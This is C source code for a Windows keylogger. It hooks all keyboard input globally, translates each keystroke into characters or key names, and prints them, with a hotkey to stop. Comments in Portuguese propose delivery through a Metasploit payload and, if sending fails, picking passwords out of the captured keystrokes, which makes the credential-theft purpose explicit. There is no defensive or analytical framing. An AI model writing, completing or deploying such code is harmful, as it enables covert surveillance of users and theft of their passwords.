#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdbool.h>
int iniciaThread(char* argv[]);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
int capsLockAtivado(void);

//Sugestão payload: metaexploit
//se nao conseguir enviar, tentar identificar senhas nas teclagens

int iniciaThread(char* argv[]) {
	HANDLE thread;
	
	thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,
		(LPVOID)argv[0], 0, NULL);

	if (thread)
	{
		return WaitForSingleObject(thread, INFINITE);
	}
	return 1;
}

DWORD WINAPI KeyLogger(LPVOID lpParameter) {
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe)
	{
		return 1;
	}
	else
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);

		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

		MSG msg;

		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			if (msg.message == WM_HOTKEY)
			{
				UnhookWindowsHookEx(hKeyHook);
				return 0;
			}
			
			TranslateMessage(&msg);
			
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;
}

LRESULT CALLBACK
LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char val[5];
	DWORD dwMsg = 1;

	switch (wParam) {
		case WM_KEYDOWN:
			DWORD vkCode = pKeyBoard->vkCode;
			if ((vkCode >= 39) && (vkCode <= 64)) //teclas 0-9
			{
				// shift ativado
				if (GetAsyncKeyState(VK_SHIFT)) // Verifica se a tecla shift está pressionada
				{
					switch (vkCode)
						// Caracteres 0-9
					{
					case 0x30:
						printf(")");
						break;
					case 0x31:
						printf("!");
						break;
					case 0x32:
						printf("@");
						break;
					case 0x33:
						printf("#");
						break;
					case 0x34:
						printf("$");
						break;
					case 0x35:
						printf("%%");
						break;
					case 0x36:
						printf("^");
						break;
					case 0x37:
						printf("&");
						break;
					case 0x38:
						printf("*");
						break;
					case 0x39:
						printf("(");
						break;
					}
				}
				else // Se a tecla shift não está pressionada
				{
					
					printf("%c",(int) vkCode);
				}
			}
			else if ((vkCode > 64) && (vkCode < 91)) // Teclas a-z
			{
				if (!(GetAsyncKeyState(VK_SHIFT) ^ capsLockAtivado())) // Verifica se as letras devem ser minúsculas
				{
					vkCode += 32; // Converte letras em minúscula
				}
				printf( "%c", vkCode);
			}
			else // Outras teclas
			{
				switch (vkCode)
					// Verifica outras teclas
				{
				case VK_CANCEL:
					printf("[Cancel]");
					break;
				case VK_SPACE:
					printf(" ");
					break;
				case VK_LCONTROL:
					printf("[LCtrl]");
					break;
				case VK_RCONTROL:
					printf("[RCtrl]");
					break;
				case VK_LMENU:
					printf("[LAlt]");
					break;
				case VK_RMENU:
					printf("[RAlt]");
					break;
				case VK_LWIN:
					printf("[LWindows]");
					break;
				case VK_RWIN:
					printf("[RWindows]");
					break;
				case VK_APPS:
					printf("[Applications]");
					break;
				case VK_SNAPSHOT:
					printf("[PrintScreen]");
					break;
				case VK_INSERT:
					printf("[Insert]");
					break;
				case VK_PAUSE:
					printf("[Pause]");
					break;
				case VK_VOLUME_MUTE:
					printf("[VolumeMute]");
					break;
				case VK_VOLUME_DOWN:
					printf("[VolumeDown]");
					break;
				case VK_VOLUME_UP:
					printf("[VolumeUp]");
					break;
				case VK_SELECT:
					printf("[Select]");
					break;
				case VK_HELP:
					printf("[Help]");
					break;
				case VK_EXECUTE:
					printf("[Execute]");
					break;
				case VK_DELETE:
					printf("[Delete]");
					break;
				case VK_CLEAR:
					printf("[Clear]");
					break;
				case VK_RETURN:
					printf("[Enter]");
					break;
				case VK_BACK:
					printf("[Backspace]");
					break;
				case VK_TAB:
					printf("[Tab]");
					break;
				case VK_ESCAPE:
					printf("[Escape]");
					break;
				case VK_LSHIFT:
					printf("[LShift]");
					break;
				case VK_RSHIFT:
					printf("[RShift]");
					break;
				case VK_CAPITAL:
					printf("[CapsLock]");
					break;
				case VK_NUMLOCK:
					printf("[NumLock]");
					break;
				case VK_SCROLL:
					printf("[ScrollLock]");
					break;
				case VK_HOME:
					printf("[Home]");
					break;
				case VK_END:
					printf("[End]");
					break;
				case VK_PLAY:
					printf("[Play]");
					break;
				case VK_ZOOM:
					printf("[Zoom]");
					break;
				case VK_DIVIDE:
					printf("[/]");
					break;
				case VK_MULTIPLY:
					printf("[*]");
					break;
				case VK_SUBTRACT:
					printf("[-]");
					break;
				case VK_ADD:
					printf("[+]");
					break;
				case VK_PRIOR:
					printf("[PageUp]");
					break;
				case VK_NEXT:
					printf("[PageDown]");
					break;
				case VK_LEFT:
					printf("[LArrow]");
					break;
				case VK_RIGHT:
					printf("[RArrow]");
					break;
				case VK_UP:
					printf("[UpArrow]");
					break;
				case VK_DOWN:
					printf("[DownArrow]");
					break;
				case VK_NUMPAD0:
					printf("[0]");
					break;
				case VK_NUMPAD1:
					printf("[1]");
					break;
				case VK_NUMPAD2:
					printf("[2]");
					break;
				case VK_NUMPAD3:
					printf("[3]");
					break;
				case VK_NUMPAD4:
					printf("[4]");
					break;
				case VK_NUMPAD5:
					printf("[5]");
					break;
				case VK_NUMPAD6:
					printf("[6]");
					break;
				case VK_NUMPAD7:
					printf("[7]");
					break;
				case VK_NUMPAD8:
					printf("[8]");
					break;
				case VK_NUMPAD9:
					printf("[9]");
					break;
				case VK_F1:
					printf("[F1]");
					break;
				case VK_F2:
					printf("[F2]");
					break;
				case VK_F3:
					printf("[F3]");
					break;
				case VK_F4:
					printf("[F4]");
					break;
				case VK_F5:
					printf("[F5]");
					break;
				case VK_F6:
					printf("[F6]");
					break;
				case VK_F7:
					printf("[F7]");
					break;
				case VK_F8:
					printf("[F8]");
					break;
				case VK_F9:
					printf("[F9]");
					break;
				case VK_F10:
					printf("[F10]");
					break;
				case VK_F11:
					printf("[F11]");
					break;
				case VK_F12:
					printf("[F12]");
					break;
				case VK_F13:
					printf("[F13]");
					break;
				case VK_F14:
					printf("[F14]");
					break;
				case VK_F15:
					printf("[F15]");
					break;
				case VK_F16:
					printf("[F16]");
					break;
				case VK_F17:
					printf("[F17]");
					break;
				case VK_F18:
					printf("[F18]");
					break;
				case VK_F19:
					printf("[F19]");
					break;
				case VK_F20:
					printf("[F20]");
					break;
				case VK_F21:
					printf("[F21]");
					break;
				case VK_F22:
					printf("[F22]");
					break;
				case VK_F23:
					printf("[F23]");
					break;
				case VK_F24:
					printf("[F24]");
					break;
				case VK_OEM_2:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("?");
					else
						printf("/");
					break;
				case VK_OEM_3:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("~");
					else
						printf("`");
					break;
				case VK_OEM_4:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("{");
					else
						printf("[");
					break;
				case VK_OEM_5:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("|");
					else
						printf("\\");
					break;
				case VK_OEM_6:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("}");
					else
						printf("]");
					break;
				case VK_OEM_7:
					if (GetAsyncKeyState(VK_SHIFT))
						printf("\\");
					else
						printf("'");
					break;
					break;
				case 0xBC:                //vírgula
					if (GetAsyncKeyState(VK_SHIFT))
						printf("<");
					else
						printf(",");
					break;
				case 0xBE:              //ponto
					if (GetAsyncKeyState(VK_SHIFT))
						printf(">");
					else
						printf(".");
					break;
				case 0xBA:              //Barra
					if (GetAsyncKeyState(VK_SHIFT))
						printf(":");
					else
						printf(";");
					break;
				case 0xBD:              //menos
					if (GetAsyncKeyState(VK_SHIFT))
						printf("_");
					else
						printf("-");
					break;
				case 0xBB:              //igual
					if (GetAsyncKeyState(VK_SHIFT))
						printf("+");
					else
						printf("=");
					break;
				default:

					dwMsg += pKeyBoard->scanCode << 16;
					dwMsg += pKeyBoard->flags << 24;

					char key[16];
					GetKeyNameText(dwMsg, key, 15);
					printf("%s", key);
				}
			}
			break;
			
		default:
			return CallNextHookEx(NULL, nCode, wParam, lParam);
			break;

	}
	return 0;
}

int capsLockAtivado(void)
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}